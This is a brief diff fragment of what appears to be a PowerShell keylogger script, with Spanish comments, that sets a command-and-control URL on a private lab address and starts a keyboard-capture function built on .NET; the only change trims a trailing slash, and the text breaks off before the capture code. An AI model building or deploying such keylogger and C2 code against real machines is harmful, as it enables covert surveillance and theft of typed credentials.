@@ -1,5 +1,5 @@
 # Configuración C2
-$C2_URL = "http://192.168.56.20:5000/"
+$C2_URL = "http://192.168.56.20:5000"
 
 # Función para capturar teclado (Uso de librerías de .NET)
 $signatures = @'
